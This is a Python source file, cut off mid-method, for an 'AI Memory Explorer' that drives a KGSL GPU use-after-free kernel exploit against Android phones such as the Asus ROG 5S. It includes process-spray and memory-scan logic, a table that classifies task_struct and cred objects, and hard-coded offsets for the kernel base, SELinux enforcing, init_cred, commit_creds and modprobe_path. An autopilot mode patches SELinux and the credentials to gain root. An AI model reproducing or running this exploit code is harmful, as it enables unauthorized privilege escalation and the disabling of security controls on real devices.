#!/usr/bin/env python3
"""
KGSL AI Memory Explorer - ROG 5S Optimized
Live TUI with ANSI colors, background learning, Ctrl+P cancel, spray logging.
"""

import os
import sys
import time
import struct
import subprocess
import threading
import json
import select
import termios
import tty
import datetime
import fcntl
import ctypes
import re

# Portable memmem() for Python (find needle in haystack)
def memmem(haystack, haystack_len, needle, needle_len):
    if needle_len == 0 or haystack_len < needle_len:
        return None
    end = haystack_len - needle_len
    for i in range(end + 1):
        if haystack[i:i+needle_len] == needle:
            return i
    return None

# ============== TUNING CONSTANTS ==============
# Number of parallel subworkers in the learning loop. Each subworker
# forks its own spray processes and runs its own scan range slice,
# really loading the device's CPU + RAM + GPU pipeline. With N=3
# we get ~3x the spray+scan throughput vs. the old single-thread loop.
# Higher N gives more parallelism but burns more RAM (spray procs are
# ~1MB each). 3 is a good balance for a phone (e.g. ROG 5S with 12GB).
LEARN_WORKERS = 3

# ============== ANSI COLORS ==============
class C:
    RST   = "\033[0m"
    BOLD  = "\033[1m"
    DIM   = "\033[2m"
    RED   = "\033[91m"
    GRN   = "\033[92m"
    YEL   = "\033[93m"
    BLU   = "\033[94m"
    MAG   = "\033[95m"
    CYN   = "\033[96m"
    WHT   = "\033[97m"
    GRY   = "\033[90m"
    BG_BLK= "\033[40m"
    INV   = "\033[7m"
    CLR   = "\033[2J\033[H"  # clear + cursor home
    HIDE  = "\033[?25l"
    SHOW  = "\033[?25h"

# Particle animation frames (used in header / status to show liveness)
PARTICLES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
SPRAY_PARTICLES = ["◐","◓","◑","◒"]

# ============== EXPLORER ==============
class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.spray_procs = []
        self.spray_log = []  # detailed log of every spray
        self.exploit_proc = None
        self.kb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "knowledge_base.json")
        self.log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "explorer_log.jsonl")
        self.knowledge_base = self.load_kb()

        # Live status state (updated by background threads)
        self.live = {
            "ram": 0.0,
            "status": "IDLE",
            "ai_patterns": self.knowledge_base.get("hit_count", 0),
            "last_msg": "Engine Ready.",
            "scan_offset": 0,
            "scan_total": 0,
            "spray_count": 0,
            "spray_target": 0,
            "kill_count": 0,
            "engine_pid": 0,
            "uptime_start": time.time(),
            "last_command": "—",
            "particle_idx": 0,
            "spray_pulse": 0,
            "last_spray_ts": 0.0,
            "sprays_per_sec": 0.0,
            "uid": -1,
            "user": "—",
        }
        self.root_verified = False

        # Command history (for Up/Down rewind)
        self.cmd_history = []
        self.cmd_hist_idx = 0
        self.last_cmd_text = ""

        # === v4.1: PERFORMANCE COUNTERS ===
        # Track MB/s of pages scanned, pages/sec sprayed, etc.
        # so the TUI can show real throughput, not just counts.
        self.perf = {
            "pages_scanned": 0,        # total pages sent to engine
            "bytes_read": 0,           # total bytes read from engine
            "spray_attempts": 0,       # total fork() calls
            "spray_alive_peak": 0,     # max simultaneous alive spray
            "scans_completed": 0,      # SCAN_DONE received
            "scans_failed": 0,         # SCAN_DONE with all failed
            "last_scan_throughput": 0.0,  # pages/sec last scan
            "matches_per_hour": 0.0,   # rolling matches/hour
            "matches_window_ts": [],   # last N match timestamps
        }

        # === v4.1: AI Q-LEARNING ===
        # Simple Q-learning table that picks the best spray parameters
        # (batch size, comm pattern, range offset) based on past
        # success rate. Without this, all 3 workers use the same
        # fixed parameters even when they're not working. With Q-
        # learning, workers explore different parameter combos and
        # exploit the ones that find matches.
        self.q_table = {}  # (state_key) -> {action: q_value}
        self.q_epsilon = 0.2  # exploration rate
        self.q_lr = 0.1       # learning rate
        self.q_actions = [
            ("batch", 10), ("batch", 20), ("batch", 40),
            ("comm", "KETO"), ("comm", "KETW"),
            ("comm", "MIXED"),
            ("range", 0), ("range", 1), ("range", 2), ("range", 3), ("range", 4),
        ]
        self.q_last_state = {}  # per-worker last state
        self.q_last_action = {} # per-worker last action

        # === v4.1: HISTOGRAM (confidence distribution) ===
        # Buckets confidence 0-100 in steps of 10 so the TUI
        # shows "where are most findings landing on confidence"
        self.conf_histogram = [0] * 11  # 0-9, 10-19, ..., 100

        # === v4.1: SPRAY v4 ALTERNATIVES ===
        # Track which spray methods work and which don't, so the
        # next batch can prefer the working ones.
        self.spray_methods_stats = {
            "popen_sleep": {"attempts": 0, "alive": 0, "matched": 0},
            "mmap_anon":   {"attempts": 0, "alive": 0, "matched": 0},
            "sendmsg":     {"attempts": 0, "alive": 0, "matched": 0},
            "setxattr":    {"attempts": 0, "alive": 0, "matched": 0},
        }

        # === v4.1: THROUGHPUT HISTORY (sparkline) ===
        # 60-element deque of pages/sec readings, one per second.
        # The TUI renders this as an ASCII sparkline so the user
        # can see if throughput is increasing, decreasing, or flat.
        self.throughput_history = [0.0] * 60
        self.throughput_idx = 0
        self._last_throughput_ts = 0.0
        self._last_pages_count = 0

        # === v4.1: KBASE SEARCH CACHE ===
        # If smart_kbase_finder() finds kbase, cache it here so
        # we don't keep re-scanning the kernel text region.
        self._kbase_search_active = False
        self._kbase_candidates = []  # list of (va, score, type)

        # === v4.1: AUTO CRED WALK STATE ===
        # When we find a task_struct with KETO* marker, we know
        # the KGSL UAF can read the task's cred pointer. We walk
        # cred->uid to find root. Track state per found item.
        self._cred_walk_done = set()  # set of (va, off) tuples already walked

        # === v4.1: KALLSYMS CACHE ===
        # If engine pipe is broken (pages=0, scans=0), we can
        # still get kbase / selinux / init_cred by reading
        # /proc/kallsyms directly. We parse it once and cache.
        self.kallsyms = {}  # name -> address
        self._kallsyms_loaded = False
        self._kallsyms_lock = threading.Lock()
        # v4.1: load kallsyms at startup so kernel base and
        # other symbols are available even if engine pipe is
        # broken. This makes the explorer useful even when
        # /dev/kgsl-3d0 is restricted (Termux has no kgsl).
        try:
            self.load_kallsyms()
        except Exception:
            pass

        # Render lock — shared by any code that writes to the TUI.
        # We use ONE thread (the main thread) for both reading and
        # painting, so the lock is rarely contended. It exists to
        # keep background workers (autopilot, learning) from
        # corrupting the TUI while we draw.
        self.render_lock = threading.Lock()
        self.is_reading_input = False

        # Engine I/O lock — CRITICAL. The KGSL engine has ONE stdin/stdout
        # pair, and we have TWO Python threads that want to talk to it
        # at the same time: _autopilot_worker (runs exploit/kbase/
        # selinux/cred/patch pipeline) and _learning_worker (runs
        # spray+scan). Without this lock, their bytes interleave in
        # the engine's stdin pipe AND their responses interleave in
        # the engine's stdout pipe. Result: the engine reads garbled
        # commands, hangs waiting for input that never comes, or
        # returns the wrong response to the wrong caller. The
        # engine's read loop in C is single-threaded, so Python
        # MUST serialize all engine I/O through this RLock.
        # RLock (reentrant) is used because _read_data_packet calls
        # _readline_timeout internally — nested acquisition must not
        # deadlock.
        self.engine_lock = threading.RLock()

        # Per-op busy flags (so TUI shows "EXPLOITING…" / "SCANNING…")
        self.op_busy = {"exploit": False, "scan": False}
        self.op_results = {"exploit": None, "scan": None}

        # Parallel learning state — subworker threads + shared stats lock.
        # Initialized eagerly so the cancel handler can walk them even
        # before cmd_learning_start is called.
        self._learn_subworkers = []
        self.stats_lock = threading.Lock()
        # learn_stats initialized eagerly so cmd_learning_start can
        # access fields (xattrs_set etc.) before _learning_worker runs.
        self.learn_stats = {
            "batches": 0, "matches": 0, "verified": 0,
            "false_positives": 0, "sprayed_total": 0,
            "xattrs_set": 0,
        }
        # Per-worker spray PID sets. KEY FIX: previously all 3 subworkers
        # shared one global list self.spray_procs, so when worker A hit
        # its RAM>70% threshold it would wipe worker B's and C's spray
        # procs with `self.spray_procs.clear()`. That left B and C with
        # nothing to scan and made the TUI show "1/3 workers" (only A
        # surviving its own cull cycle). Now each worker owns its own
        # set of PIDs; cross-kill is impossible.
        self.spray_procs_by_worker = {}
        # Adaptive scan state — when no matches are found in 5
        # consecutive batches, the scan range is shifted to try
        # a different part of the address space. Initialized here
        # so the TUI can read it even before cmd_learning_start.
        self._adaptive_scan = {
            "no_match_batches": 0,
            "offset_idx": 0,
            "ranges_tried": [],
        }

        # === SPRAY MAP / SCAN MAP ===
        # Visual 2D map of the address space. We split the 32MB
        # UAF range into 64 buckets of 512KB each and track the
        # state of each bucket:
        #   0 = unscanned, gray
        #   1 = spraying now, yellow
        #   2 = spray error, red
        #   3 = scanning now, orange
        #   4 = scan error, dark orange
        #   5 = fully done, blue/gray
        #   6 = FOUND (non-zero data), green
        # The map is rendered in the TUI as a 8x8 grid so the
        # user can see at a glance which areas we've covered.
        self.SPRAY_MAP_BUCKETS = 64  # 8x8 grid
        self.SPRAY_MAP_BUCKET_SIZE = 0x2000000 // self.SPRAY_MAP_BUCKETS
        self.spray_map = [0] * self.SPRAY_MAP_BUCKETS

        # === W3 (deep-scan worker) ===
        # Dedicated 4th worker that re-scans Empty Page locations
        # to verify they're really empty. The user reported that
        # the 3 Empty Page addresses (0xffffffc000000000 etc.) are
        # "where the spray should be" — W3 keeps poking at them
        # to see if anything new appears.
        self.w3_thread = None
        self.w3_enabled = False

        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.engine_path = os.path.join(base_dir, "kgsl_engine")

        # === PRE-FLIGHT: ensure engine binary exists ===
        # If the C engine binary is missing or not ELF, compile it
        # NOW (synchronously) so the very first auto-start has a
        # working engine. Without this, the first ensure_engine()
        # call tries to Popen a missing file and silently fails
        # for several seconds while the user wonders why nothing
        # is happening.
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        else:
            try:
                with open(self.engine_path, "rb") as _f:
                    if _f.read(4) != b"\x7fELF":
                        self.try_compile_engine()
            except Exception:
                self.try_compile_engine()

        self.uaf_start = 0x7001ff000
        self.scan_size  = 0x2000000

        # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
        self.cred_offset  = 0x770            # task_struct.cred (kernel 5.4)
        self.comm_offset  = 0x718            # task_struct.comm
        self.real_cred_offset = 0x768
        # v6.c uses MARKER_OFF = 0xfd8 to be different from comm.
        # We try BOTH (comm at 0x718 AND marker at 0xfd8) so we work
        # with v6.c as well as our KETO0422 spray.
        self.marker_offsets = (0x718, 0xfd8, 0x778, 0x7c8, 0x808,
                               0x848, 0x888, 0x8c8, 0x908, 0x948,
                               0x988, 0x9c8, 0xa08, 0xa48, 0xa88,
                               0xac8, 0xb08, 0xb48, 0xb88, 0xbc8,
                               0xc08, 0xc48, 0xc88, 0xcc8, 0xd08,
                               0xd48, 0xd88, 0xdc8, 0xe08, 0xe48,
                               0xe88, 0xec8, 0xf08, 0xf48, 0xf88,
                               0xfc8, 0xfd8, 0x1018, 0x1058, 0x1098)
        # Kernel base candidates (from v6.c) + common AArch64 ranges.
        # Includes `0xffffff8cXXXX0000` (Asus/Snapdragon 888/8 Gen 1
        # builds), `0xffffffaf…` (Tensor/Exynos), `0xffffffb0…`
        # (Kirin/Huawei), `0xffffff95…` (MediaTek).
        self.kernel_base_candidates = [
            0xffffffc000000000, 0xffffffc010000000, 0xffffffc020000000,
            0xffffffc030000000, 0xffffffc035000000, 0xffffffc040000000,
            0xffffffc008200000, 0xffffffb000000000, 0xffffffa000000000,
            0xffffffaf00000000, 0xffffffaf20000000, 0xffffff9550000000,
            0xffffff94d0000000, 0xffffff8e70000000,
            # From screenshot — 0xffffff8cc1000000 (Asus ROG 5S / SD888)
            0xffffff8c00000000, 0xffffff8c10000000, 0xffffff8cc0000000,
            0xffffff8cc1000000, 0xffffff8cd0000000,
            # Tensor / Exynos (0xffffffaf…)
            0xffffffaf00000000, 0xffffffaf10000000, 0xffffffaf20000000,
            # Kirin 9000/990 (0xffffffb0…)
            0xffffffb000000000, 0xffffffb010000000, 0xffffffb020000000,
            # OnePlus/Samsung SD865
            0xffffff8c80000000, 0xffffff8d00000000,
        ]
        # Generic AArch64 kernel range — any 0xffffff8X_00000000 or
        # 0xffffff9X_00000000 is a valid candidate. We auto-discover
        # kernel base from task_struct pointers too.
        self.kbase_discovery_masks = (
            0xffffffff00000000,  # mask out low 32 bits → 1MB aligned
            0xffffffffff000000,  # mask out low 24 bits → 16MB aligned
            0xfffffffffffff000,  # mask out low 12 bits → 4KB aligned
        )
        # SELinux enforcing offsets (from v6.c candidates)
        self.selinux_offset_candidates = [
            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x3709ce8,
            0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
            0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
        ]
        # Other interesting kernel globals to try. poweroff_cmd at
        # 0x2bb8ec0 was found by the user on the SD888 kernel.
        self.interesting_offsets = {
            "selinux_enabled":  [0x02cab000, 0x2f74d00, 0x32aad00,
                                 0x2f74d08, 0x32aad08, 0x3709d08],
            "kptr_restrict":    [0x0284e000, 0x0252b000, 0x027fa000,
                                 0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8],
            "apparmor_enabled": [0x02d68000, 0x2c5b000, 0x2d37000,
                                 0x2bb8ec0],
            # poweroff_cmd is in .data, often 4-byte aligned
            "poweroff_cmd":     [0x2bb8ec0, 0x2bb8ec4, 0x2bb8ec8,
                                 0x2bb8eb0, 0x2bb8ed0],
            # commit_creds / prepare_kernel_cred — function pointers
            # (kallsyms-like). Useful for ROP / shellcode.
            "commit_creds":     [0x0b80ed0, 0x0b80ed8, 0x0b80ee0],
            "prepare_kernel_cred": [0x0b80ee8, 0x0b80ef0, 0x0b80ef8],
            # modprobe_path — 256-byte string, but anchor is the first
            # 4 bytes containing the path
            "modprobe_path":    [0x0a450c0, 0x0a450c4, 0x0a450c8],
        }
        # init_cred — primary offset from v6.c, plus alternates
        self.init_cred_offset = 0x018f9038
        self.init_cred_alternates = [
            0x018f9038, 0x018a5038, 0x01973038, 0x01939038,
            0x019f1038, 0x01a3b038, 0x01a6d038, 0x01a9f038,
        ]
        self.kernel_base = None
        self.selinux_va  = None
        self.cred_va     = None
        self.auto_mode   = True    # pressing E auto-runs full pipeline
        # === SPRAY TECHNIQUE TOGGLE ===
        # setxattr is unreliable on Termux because of seccomp filters —
        # raw syscall(188) triggers SIGSYS and kills the process, and
        # even os.setxattr() may be blocked. Default to off so the
        # spray loop never crashes. User can enable with 'xt' command
        # once we confirm it works on their device.
        self.use_xattr_spray = False
        # xattr_warmup_done: set True after the first successful or
        # failed xattr call. Used to skip on the first iteration if
        # SIGSYS is going to kill us.
        self._xattr_warmup_done = False
        # === FULL AUTOPILOT MODE ===
        # When ON (default), the explorer starts the full pipeline on
        # launch and never stops. It will:
        #   - spray + scan + learn
        #   - when a task_struct is found → auto-find kbase, selinux, cred
        #   - auto-patch SELinux + init_cred
        #   - auto-verify root
        #   - auto-retry on any failure
        # The user can still pause with `P` and resume with `G`.
        self.autopilot_mode   = True
        self.autopilot_paused = False
        self.autopilot_thread = None
        self.watch_mode  = False   # auto-re-run exploit pipeline in background
        self.watch_thread = None

        # Cancel flag for background operations
        self.cancel_flag = threading.Event()
        self.bg_thread = None
        self.bg_lock = threading.Lock()

        # Heuristics — device-agnostic: covers Android, AOSP, Google, Samsung,
        # Huawei, Sony, Xiaomi, OnePlus, Asus and other common packages.
        self.system_apps = {
            # AOSP / Google
            "com.android.settings":     "System Settings (Developer Mode)",
            "com.android.systemui":     "System UI (Status Bar/Home)",
            "com.android.camera":       "Camera Driver Context",
            "com.android.gallery3d":    "Gallery/Media Provider",
            "com.android.deskclock":    "System Clock/Alarms",
            "com.android.contacts":     "Contacts/Phonebook",
            "com.android.phone":        "Phone/Telephony Service",
            "com.android.inputmethod":  "IME / Keyboard Service",
            "com.android.launcher":     "AOSP Launcher (Home Screen)",
            "com.android.shell":        "ADB Shell / Root Helper",
            "com.android.keyguard":     "Lock Screen Service",
            "com.android.providers.media": "Media Provider (DCIM)",
            "com.android.webview":      "System WebView (Chromium)",
            "com.google.android.gms":   "Google Play Services",
            "com.google.android.gsf":   "Google Services Framework",
            # Samsung
            "com.samsung.android.launcher":  "Samsung OneUI Launcher",
            "com.samsung.android.app.spage": "Samsung Daily Briefing",
            "com.samsung.android.sm_cn":     "Samsung SmartThings",
            "com.sec.android.app.launcher":  "Samsung Legacy Launcher",
            # Huawei / Honor
            "com.huawei.android.launcher":    "Huawei EMUI Launcher",
            "com.hihonor.android.launcher":   "Honor MagicUI Launcher",
            "com.huawei.systemui":            "Huawei SystemUI",
            # Sony
            "com.sonyericsson.home":          "Sony Xperia Home",
            "com.sonymobile.home":            "Sony Xperia Home (new)",
            # Xiaomi / Redmi / POCO
            "com.miui.home":                  "Xiaomi MIUI Launcher",
            "com.miui.systemui":              "Xiaomi SystemUI",
            # OnePlus / OPPO / Realme (ColorOS / OxygenOS)
            "com.oneplus.launcher":           "OnePlus Launcher",
            "com.oppo.launcher":              "OPPO ColorOS Launcher",
            # Asus (ROG / Zenfone)
            "com.asus.launcher":              "ASUS Launcher (ROG/Zenfone)",
            "com.asus.weathertime":           "ASUS Weather Widget",
            # Other common
            "android.uid.system":             "System UID Context (UID 1000)",
            "android.uid.phone":              "Phone UID Context",
            "u:object_r:system_app:s0":       "SELinux System App Label",
            "u:object_r:priv_app:s0":         "SELinux Privileged App Label",
        }
        # Kernel structure markers (device-agnostic — AArch64 ELF magic,
        # ARM64 prologue, common kernel strings, KGSL driver markers).
        self.kernel_structures = {
            b"KETO0422":                  "task_struct (Active Process Marker)",
            b"init_cred":                 "Kernel Root Credentials (Global)",
            b"selinux_enforcing":         "SELinux Status Bit",
            b"selinux_enabled":           "SELinux Enable Switch",
            b"kptr_restrict":             "Kernel Pointer Restriction",
            b"\x7f" + b"ELF":             "Kernel Executable Header (Base)",
            b"\xFD\x7B\xBF\xA9":          "AArch64 Function Prologue (Code)",
            b"\x00\x00\x00\x94":          "AArch64 BL/BLR Instruction",
            b"Linux version":             "Kernel Banner String",
            b"kgsl-3d0":                  "KGSL GPU Driver (target device)",
            b"mdss_fb":                   "Display Framebuffer Driver",
            b"abov_sar":                  "SAR Sensor (vendor-specific)",
            b"scsi":                      "SCSI Storage Subsystem",
            b"slub":                      "SLUB Allocator Marker",
            b"cred_jar":                  "Cred Cache (SLUB)",
            b"task_struct":               "Task Struct Type Name",
            b"kmem_cache":                "Kernel Memory Cache",
            b"modprobe_path":             "Modprobe Helper Path",
            b"core_pattern":              "Core Dump Pattern",
            b"poweroff_cmd":              "Poweroff Command Path",
        }
        self.offsets = {"pid": 0x548, "comm": 0x718, "cred": 0x770, "real_cred": 0x768, "tasks": 0x3f0}

        # Start live updater (updates live{} dict only; does NOT draw)
        self._stop_live = threading.Event()
        threading.Thread(target=self._live_updater, daemon=True).start()
        # NOTE: The render thread (_render_thread) is started later in
        # run() — it is the sole render thread. We do NOT start
        # _auto_renderer() here to avoid double-render deadlocks.

    # ============== KNOWLEDGE BASE ==============
    def load_kb(self):
        if os.path.exists(self.kb_path):
            try:
                with open(self.kb_path, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"successful_vas": [], "hit_count": 0, "ranges": []}

    def save_kb(self):
        with open(self.kb_path, 'w') as f:
            json.dump(self.knowledge_base, f, indent=4)

    # ============== LOGGING ==============
    def log_event(self, event_type, data):
        """Append event to global JSONL log. Called by spray + scan + patch."""
        entry = {
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            **data,
        }
        try:
            with open(self.log_path, 'a') as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass
        # mirror short events in spray_log
        if event_type in ("spray", "kill", "scan_match", "patch"):
            self.spray_log.append(entry)

    # ============== AI CLASSIFIER ==============
    def classify_page(self, page_data, va, sig=0, off_in_page=-1):
        """Classify a found memory page. sig comes from the C engine
        (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
         6=cred pointer, 7=Linux version banner, 8=kernel text/data marker,
         9=root-cred heap pattern). 100% when sig>0. SELinux is no longer
        found by random scan — it must be probed via _probe_selinux
        (known offset)."""
        # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
        if sig == 1:
            cred_va = va + (self.cred_offset - off_in_page)
            return {
                "type": "Privilege Struct",
                "description": f"task_struct (KETO0422 comm @ 0x{off_in_page:x}) — cred @ {cred_va:#x}",
                "va": hex(va),
                "confidence": 100,
                "data": page_data,
            }
        # 2. system app string — 100% it's a system app
        if sig == 2:
            name = b"com.android."
            idx = page_data.find(name)
            app = page_data[idx:idx+64].split(b"\x00")[0].decode(errors="ignore") if idx >= 0 else "?"
            return {"type": "System App", "description": app, "va": hex(va),
                    "confidence": 100, "data": page_data}
        # 3. kernel ELF — 100% it's the kernel base
        if sig == 3:
            return {"type": "Kernel Code", "description": "Kernel ELF header (100% kernel base)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 4. init_cred string — 100% init_cred struct
        if sig == 4:
            return {"type": "Privilege Struct", "description": "init_cred (100% cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 6. cred pointer — 100% it's a task_struct cred field
        if sig == 6:
            cred_va = va + off_in_page
            return {"type": "Privilege Struct",
                    "description": f"cred pointer @ 0x{off_in_page:x} (100% task_struct.cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 7. Linux version banner — 100% it's kernel text/.rodata
        if sig == 7:
            tail = page_data[off_in_page:off_in_page + 64].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Kernel Code",
                    "description": f"Linux banner: {tail[:50]}",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 8. Kernel text/data marker — 95% it's a kernel symbol
        if sig == 8:
            tail = page_data[off_in_page:off_in_page + 32].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Kernel Code",
                    "description": f"Kernel marker: '{tail}' @ 0x{off_in_page:x}",
                    "va": hex(va), "confidence": 95, "data": page_data}
        # 9. Root-cred heap pattern — 90% it's init_cred / a cred with uid=0
        if sig == 9:
            return {"type": "Privilege Struct",
                    "description": "Root cred (usage=1, uid/gid=0, kptr in field)",
                    "va": hex(va), "confidence": 90, "data": page_data}
        # 10. Real Linux kernel comm string (swapper/0, kthreadd, init, kworker, …)
        #     This is a strong task_struct indicator (without our spray marker).
        if sig == 10:
            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Task Struct",
                    "description": f"Real kernel comm '{tail}' @ 0x{off_in_page:x} (task_struct on 5.4)",
                    "va": hex(va), "confidence": 95, "data": page_data}
        # 11. Dense kernel heap page (>= 8 kernel pointers, >= 30% non-zero).
        #     Strong indicator of an active kernel slab object (cred, task_struct,
        #     file, inode, …). Classify as "Kernel Heap Object" with the offset
        #     info so the user can drill in.
        if sig == 11:
            return {"type": "Kernel Heap",
                    "description": "Dense kernel heap page (>= 8 kernel VAs, 30%+ non-zero)",
                    "va": hex(va), "confidence": 75, "data": page_data}
        # 12. Sparse kernel heap page (>= 3 kernel pointers, >= 16% non-zero).
        #     Could be a kallsyms entry, /sys data, a sparse slab object.
        if sig == 12:
            return {"type": "Kernel Heap",
                    "description": "Sparse kernel data (>= 3 kernel VAs, 16%+ non-zero)",
                    "va": hex(va), "confidence": 55, "data": page_data}
        # 13. task_struct detected by task_struct.stack (kernel ptr at
        #     0x30) + __state (u32<0x100) + usage (u32 1..0xffff) layout
        #     on Linux 5.4. This is one of the strongest indicators
        #     that the page is a real task_struct — we don't need our
        #     spray marker to match.
        if sig == 13:
            return {"type": "Task Struct",
                    "description": (f"task_struct layout @ 0x{off_in_page:x} "
                                    f"(stack+state+usage) on 5.4"),
                    "va": hex(va), "confidence": 88, "data": page_data}
        # 14. task_struct with a cred pointer at 0x6a0/0x768/0x770/0x7c0
        #     that points into plausible kmalloc range + a comm-ish
        #     ASCII run somewhere in the page. This means we can walk
        #     the cred chain from this struct directly.
        if sig == 14:
            return {"type": "Task Struct",
                    "description": (f"task_struct with cred ptr @ "
                                    f"0x{off_in_page:x} on 5.4"),
                    "va": hex(va), "confidence": 92, "data": page_data}
        # 15. Process state page — has u32 in {0,1,4,8,16,32,64} +
        #     plausible pid in next 0x80 bytes (>= 2 hits). Could be
        #     a process info page or a wait-queue.
        if sig == 15:
            return {"type": "Process State",
                    "description": (f"Process state @ 0x{off_in_page:x} "
                                    f"(2+ state+pid pairs)"),
                    "va": hex(va), "confidence": 60, "data": page_data}
        # 17. Generic comm-like field (4-7 ASCII bytes + 4+ NULs in next
        #     12). Catches arbitrary process comms, including our spray
        #     processes whose prctl-set name is in KGSL range. Lower
        #     confidence because we don't have a known comm to compare
        #     against, but still a strong task_struct indicator.
        if sig == 17:
            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Task Struct",
                    "description": (f"comm-like field '{tail}' @ 0x{off_in_page:x} "
                                    f"(16-byte comm + NUL pad)"),
                    "va": hex(va), "confidence": 75, "data": page_data}

        # Fallback heuristic classification (no sig from engine)
        # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
        idx = page_data.find(b"KETO0422")
        if idx >= 0:
            # If we got a task_struct without sig (shouldn't happen), still mark 100%
            cred_va = va + (self.cred_offset - idx) if idx >= 0 else 0
            return {"type": "Privilege Struct",
                    "description": f"task_struct (KETO0422) cred @ {cred_va:#x}",
                    "va": hex(va), "confidence": 100, "data": page_data}
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va),
                        "confidence": 80, "data": page_data}
        for sig_b, name in self.kernel_structures.items():
            if sig_b in page_data:
                if hex(va) not in self.knowledge_base["successful_vas"]:
                    self.knowledge_base["successful_vas"].append(hex(va))
                    self.knowledge_base["hit_count"] += 1
                    self.save_kb()
                return {"type": "Kernel Core", "description": name, "va": hex(va),
                        "confidence": 70, "data": page_data}
        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "CRED for UID 10237",
                    "va": hex(va), "confidence": 60, "data": page_data}
        sys_uid = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if sys_uid in page_data:
            return {"type": "Privilege Struct", "description": "System UID (1000)",
                    "va": hex(va), "confidence": 60, "data": page_data}
        if b"\x00\x00\x00\x94" in page_data:
            return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
                    "va": hex(va), "confidence": 60, "data": page_data}
        # Permissive fallback: use _is_page_interesting so we get a useful
        # description/confidence instead of a generic "Unclassified Data Fragment"
        interesting, reason, conf = self._is_page_interesting(page_data)
        if interesting:
            return {"type": "Unknown Object",
                    "description": f"Auto-classified ({reason})",
                    "va": hex(va), "confidence": conf, "data": page_data}

        # === EXTENDED FALLBACK HEURISTICS ===
        # The code below catches pages that didn't match any of the
        # explicit sigs (1-17) and didn't pass _is_page_interesting.
        # We try a wider set of patterns so the user sees meaningful
        # types in the File Manager instead of "Unclassified".
        # Kernel comm strings (Linux 5.4 default set)
        kernel_comms = (
            b"swapper/", b"kthreadd\x00", b"init\x00", b"kworker/",
            b"migration/", b"ksoftirqd/", b"rcu_", b"kdevtmpfs",
            b"oom_reaper", b"writeback", b"kcompactd", b"crypto",
            b"watchdog/", b"cpuhp/", b"kblockd", b"systemd",
            b"kswapd", b"kthrotld", b"irq/", b"scsi_", b"xfs",
            b"ipv6_addrconf", b"kworker",
        )
        for kc in kernel_comms:
            if kc in page_data:
                idx = page_data.find(kc)
                tail = page_data[idx:idx+16].split(b"\x00")[0].decode(errors="ignore")
                return {"type": "Task Struct",
                        "description": (f"kernel comm '{tail}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 80, "data": page_data}
        # Any KETO* / KETW* pattern (4-7 byte ASCII + NUL pad) anywhere
        for marker in (b"KETO", b"KETW"):
            idx = page_data.find(marker)
            if idx >= 0:
                tail = page_data[idx:idx+8].split(b"\x00")[0].decode(errors="ignore")
                return {"type": "Spray Marker",
                        "description": (f"spray comm '{tail}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 85, "data": page_data}
        # KGSL/ioctl strings (kernel driver-specific memory)
        for kgsl_str in (b"kgsl-3d0", b"adreno", b"msm_gpu", b"kgsl",
                         b"i915", b"drm", b"mali", b"pvr"):
            if kgsl_str in page_data:
                idx = page_data.find(kgsl_str)
                return {"type": "Kernel Driver",
                        "description": (f"GPU/KGSL string '{kgsl_str.decode()}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 70, "data": page_data}
        # High kernel pointer density (>= 5 kptrs, > 30% non-zero)
        kptrs = 0
        nz = 0
        for qi in range(0, 4096, 8):
            qv = struct.unpack("<Q", page_data[qi:qi+8])[0]
            if qv: nz += 1
            if (qv >> 32) >= 0xffffff80 and (qv >> 40) <= 0xffffffcf and qv:
                kptrs += 1
        if kptrs >= 5 and nz > 1200:
            return {"type": "Kernel Heap",
                    "description": f"dense kernel heap ({kptrs} kptrs, {nz*8/4096*100:.0f}% nz)",
                    "va": hex(va), "confidence": 65, "data": page_data}
        if kptrs >= 3:
            return {"type": "Kernel Heap",
                    "description": f"kernel heap ({kptrs} kptrs, {nz*8/4096*100:.0f}% nz)",
                    "va": hex(va), "confidence": 50, "data": page_data}
        # ELF magic (kernel .text segment)
        if page_data[:4] == b"\x7fELF":
            return {"type": "Kernel Code",
                    "description": "ELF header (kernel .text)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # If page is fully zero, mark as such
        if nz == 0:
            return {"type": "Empty Page",
                    "description": "all-zero (unallocated)",
                    "va": hex(va), "confidence": 0, "data": page_data}
        return {"type": "Unknown Object",
                "description": f"Unclassified (kptrs={kptrs} nz={nz*8/4096*100:.0f}%)",
                "va": hex(va), "confidence": 10, "data": page_data}

    def translate_logic(self, item):
        data = item['data']
        desc = item['description']
